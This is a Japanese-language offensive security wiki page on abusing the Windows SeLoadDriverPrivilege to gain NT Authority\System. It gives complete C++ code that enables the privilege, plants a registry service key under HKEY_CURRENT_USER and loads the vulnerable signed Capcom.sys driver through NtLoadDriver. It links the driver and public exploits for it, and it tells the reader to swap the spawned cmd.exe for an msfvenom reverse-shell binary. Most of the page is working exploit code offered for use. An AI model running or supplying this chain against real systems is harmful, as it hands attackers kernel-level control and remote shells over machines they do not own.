# SeLoadDriverPrivilege <a href="#seloaddriverprivilege" id="seloaddriverprivilege"></a>

どのユーザーにも割り当てるのが非常に危険な特権です - この特権を持つユーザーはカーネルドライバをロードし、`NT\System`としてコードを実行できます。`offense\spotless`ユーザーがこの特権を持っていることを確認してください:

![](../../../.gitbook/assets/a8.png)

`Whoami /priv` は、デフォルトでこの特権が無効になっていることを示します:

![](../../../.gitbook/assets/a9.png)

ただし、以下のコードを使用すると、この特権をかなり簡単に有効にできます:

{% code title="privileges.cpp" %}
```c
#include "stdafx.h"
#include <windows.h>
#include <stdio.h>

int main()
{
TOKEN_PRIVILEGES tp;
LUID luid;
bool bEnablePrivilege(true);
HANDLE hToken(NULL);
OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);

if (!LookupPrivilegeValue(
NULL,            // lookup privilege on local system
L"SeLoadDriverPrivilege",   // privilege to lookup
&luid))        // receives LUID of privilege
{
printf("LookupPrivilegeValue error: %un", GetLastError());
return FALSE;
}
tp.PrivilegeCount = 1;
tp.Privileges[0].Luid = luid;

if (bEnablePrivilege) {
tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
}

// Enable the privilege or disable all privileges.
if (!AdjustTokenPrivileges(
hToken,
FALSE,
&tp,
sizeof(TOKEN_PRIVILEGES),
(PTOKEN_PRIVILEGES)NULL,
(PDWORD)NULL))
{
printf("AdjustTokenPrivileges error: %x", GetLastError());
return FALSE;
}

system("cmd");
return 0;
}
```
{% endcode %}

上記をコンパイルし、実行すると、特権 `SeLoadDriverPrivilege` が有効になります：

![](../../../.gitbook/assets/a10.png)

### Capcom.sys ドライバーの脆弱性 <a href="#capcom-sys-driver-exploit" id="capcom-sys-driver-exploit"></a>

`SeLoadDriverPrivilege` が危険であることをさらに証明するために、特権を昇格させるためにそれを**悪用**します。

**NTLoadDriver** を使用して新しいドライバーをロードできます：
```cpp
NTSTATUS NTLoadDriver(
_In_ PUNICODE_STRING DriverServiceName
);
```
デフォルトでは、ドライバーサービス名は`\Registry\Machine\System\CurrentControlSet\Services\`の下にあるはずです。

しかし、**ドキュメント**によると、**HKEY\_CURRENT\_USER**の下にパスを使用することもできるため、そこに**レジストリを変更**して、システムに**任意のドライバーをロード**することができます。\
新しいレジストリに定義する必要がある関連するパラメータは次のとおりです:

- **ImagePath:** ドライバーパスを指定するREG\_EXPAND\_SZタイプの値。このコンテキストでは、パスは特権のないユーザーによる変更権限を持つディレクトリである必要があります。
- **Type:** REG\_WORDタイプの値で、サービスのタイプが示されます。この目的のために、値はSERVICE\_KERNEL\_DRIVER (0x00000001)として定義される必要があります。

したがって、**`\Registry\User\<User-SID>\System\CurrentControlSet\MyService`**に新しいレジストリを作成し、**ImagePath**にドライバーへのパスを、**Type**に値1を指定し、その値をエクスプロイトで使用できます（ユーザーSIDは、`Get-ADUser -Identity 'USERNAME' | select SID`または`(New-Object System.Security.Principal.NTAccount("USERNAME")).Translate([System.Security.Principal.SecurityIdentifier]).value`を使用して取得できます）。
```bash
PCWSTR pPathSource = L"C:\\experiments\\privileges\\Capcom.sys";
PCWSTR pPathSourceReg = L"\\Registry\\User\\<User-SID>\\System\\CurrentControlSet\\MyService";
```
最初のものは、被害者システム上の脆弱な**Capcom.sys**ドライバーの場所を示す文字列変数を宣言し、2番目のものは使用されるサービス名を示す文字列変数です（任意のサービスである可能性があります）。\
**ドライバーはWindowsによって署名されている必要がある**ため、任意のドライバーをロードすることはできません。しかし、**Capcom.sys** **は任意のコードを実行するために悪用され、Windowsによって署名されています**ので、このドライバーをロードして悪用することが目標です。

ドライバーをロードする:
```c
#include "stdafx.h"
#include <windows.h>
#include <stdio.h>
#include <ntsecapi.h>
#include <stdlib.h>
#include <locale.h>
#include <iostream>
#include "stdafx.h"

NTSTATUS(NTAPI *NtLoadDriver)(IN PUNICODE_STRING DriverServiceName);
VOID(NTAPI *RtlInitUnicodeString)(PUNICODE_STRING DestinationString, PCWSTR SourceString);
NTSTATUS(NTAPI *NtUnloadDriver)(IN PUNICODE_STRING DriverServiceName);

int main()
{
TOKEN_PRIVILEGES tp;
LUID luid;
bool bEnablePrivilege(true);
HANDLE hToken(NULL);
OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);

if (!LookupPrivilegeValue(
NULL,            // lookup privilege on local system
L"SeLoadDriverPrivilege",   // privilege to lookup
&luid))        // receives LUID of privilege
{
printf("LookupPrivilegeValue error: %un", GetLastError());
return FALSE;
}
tp.PrivilegeCount = 1;
tp.Privileges[0].Luid = luid;

if (bEnablePrivilege) {
tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
}

// Enable the privilege or disable all privileges.
if (!AdjustTokenPrivileges(
hToken,
FALSE,
&tp,
sizeof(TOKEN_PRIVILEGES),
(PTOKEN_PRIVILEGES)NULL,
(PDWORD)NULL))
{
printf("AdjustTokenPrivileges error: %x", GetLastError());
return FALSE;
}

//system("cmd");
// below code for loading drivers is taken from https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/RDI/dll/NtLoadDriver.h
std::cout << "[+] Set Registry Keys" << std::endl;
NTSTATUS st1;
UNICODE_STRING pPath;
UNICODE_STRING pPathReg;
PCWSTR pPathSource = L"C:\\experiments\\privileges\\Capcom.sys";
PCWSTR pPathSourceReg = L"\\Registry\\User\\<User-SID>\\System\\CurrentControlSet\\MyService";
const char NTDLL[] = { 0x6e, 0x74, 0x64, 0x6c, 0x6c, 0x2e, 0x64, 0x6c, 0x6c, 0x00 };
HMODULE hObsolete = GetModuleHandleA(NTDLL);
*(FARPROC *)&RtlInitUnicodeString = GetProcAddress(hObsolete, "RtlInitUnicodeString");
*(FARPROC *)&NtLoadDriver = GetProcAddress(hObsolete, "NtLoadDriver");
*(FARPROC *)&NtUnloadDriver = GetProcAddress(hObsolete, "NtUnloadDriver");

RtlInitUnicodeString(&pPath, pPathSource);
RtlInitUnicodeString(&pPathReg, pPathSourceReg);
st1 = NtLoadDriver(&pPathReg);
std::cout << "[+] value of st1: " << st1 << "\n";
if (st1 == ERROR_SUCCESS) {
std::cout << "[+] Driver Loaded as Kernel..\n";
std::cout << "[+] Press [ENTER] to unload driver\n";
}

getchar();
st1 = NtUnloadDriver(&pPathReg);
if (st1 == ERROR_SUCCESS) {
std::cout << "[+] Driver unloaded from Kernel..\n";
std::cout << "[+] Press [ENTER] to exit\n";
getchar();
}

return 0;
}
```
上記のコードがコンパイルおよび実行されると、悪意のある `Capcom.sys` ドライバーが被害システムにロードされることが確認できます：

![](../../../.gitbook/assets/a11.png)

ダウンロード: [Capcom.sys - 10KB](https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LTyWsUdKa48PyMRyZ4I%2F-LTyZ9IkoofuWRxlNpUG%2FCapcom.sys?alt=media\&token=e4417fb3-f2fd-42ef-9000-d410bc6ceb54)

**今度はロードされたドライバーを悪用して任意のコードを実行します。**

[https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom) および [https://github.com/zerosum0x0/puppetstrings](https://github.com/zerosum0x0/puppetstrings) からエクスプロイトをダウンロードし、システムで実行して特権を `NT Authority\System` に昇格させます：

![](../../../.gitbook/assets/a12.png)

### GUI なし

ターゲットへの **GUI アクセスがない** 場合、コンパイル前に **`ExploitCapcom.cpp`** コードを変更する必要があります。ここでは、行 292 を編集し、`C:\\Windows\\system32\\cmd.exe"` を、例えば `msfvenom` で作成した逆シェルバイナリ（例: `c:\ProgramData\revshell.exe`）に置き換えることができます。

コード: c
```c
// Launches a command shell process
static bool LaunchShell()
{
TCHAR CommandLine[] = TEXT("C:\\Windows\\system32\\cmd.exe");
PROCESS_INFORMATION ProcessInfo;
STARTUPINFO StartupInfo = { sizeof(StartupInfo) };
if (!CreateProcess(CommandLine, CommandLine, nullptr, nullptr, FALSE,
CREATE_NEW_CONSOLE, nullptr, nullptr, &StartupInfo,
&ProcessInfo))
{
return false;
}

CloseHandle(ProcessInfo.hThread);
CloseHandle(ProcessInfo.hProcess);
return true;
}
```
この例での`CommandLine`文字列は次のように変更されます：

コード：c
```c
TCHAR CommandLine[] = TEXT("C:\\ProgramData\\revshell.exe");
```
### 自動

[https://github.com/TarlogicSecurity/EoPLoadDriver/](https://github.com/TarlogicSecurity/EoPLoadDriver/)を使用して、**特権を自動的に有効に**し、HKEY\_CURRENT\_USERの下に**レジストリキーを作成**し、NTLoadDriverを実行して、作成したいレジストリキーとドライバーへのパスを指定します：

![](<../../../.gitbook/assets/image (289).png>)

その後、**Capcom.sys**のエクスプロイトをダウンロードして特権を昇格させる必要があります。
